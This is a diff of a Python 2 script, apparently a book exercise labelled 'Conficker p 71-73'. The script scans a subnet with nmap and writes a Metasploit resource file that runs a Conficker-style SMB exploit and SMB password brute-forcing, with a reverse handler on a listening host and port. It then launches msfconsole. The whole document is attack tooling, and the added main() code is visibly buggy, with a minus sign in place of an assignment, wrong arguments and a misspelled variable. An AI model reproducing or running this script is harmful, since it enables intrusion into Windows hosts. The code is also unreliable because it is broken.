@@ -1,8 +1,9 @@
-
-import nmap
+#!/usr/bin/env python
+import nmap, os, optparse, sys
 
 def banner():
-	print "####  Conficker p 71-73   #####"
+	print "  #########  Conficker p 71-73  #########          "
+	print ""
 
 def findTgts(subnet):
 	nmScan = nmap.PortScanner()
@@ -43,8 +44,30 @@ def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
 		configFile.write('exploit -j -z\n')
 
 def main():
-
-
+	banner()
+	configFile = open('meta.rc', 'w')
+	parser - optparse.OptionParser('[-] Usage%prog '+'-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password file>]')
+	parser.add_option('-H', dest='tgtHosts', type='string', help='specify target address[es]')
+	parser.add_option('-p', dest='lport', type='string', help='specify the listening port')
+	parser.add_option('-l', dest='lhost', type='string', help='specify the listening host')
+	parser.add_option('-F', dest='passwdFile', type='string', help='password file for the SMB brute force attempt')
+	(options, args) = parser.parse_args()
+	if (options, args) == None | (options, lhost == None):
+		print parser.usage
+		exit(0)
+	lhost = options.lhost
+	lport = options.lport
+	if lport == None:
+		lport = '1337'
+	passwdFile = options.passwdFile
+	tgtHosts = findTgts(options, tgtHosts)
+	setupHandler(configFile, lhost, lpott)
+	for tgtHost in tgtHosts:
+		confickerExploit(configFile, tgtHost, lhost, lport)
+		if passwdFile != None:
+			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
+		configFile.close()
+		os.system('msfconsole -r meta.rc')
 
 if __name__ == '__main__':
 	main()
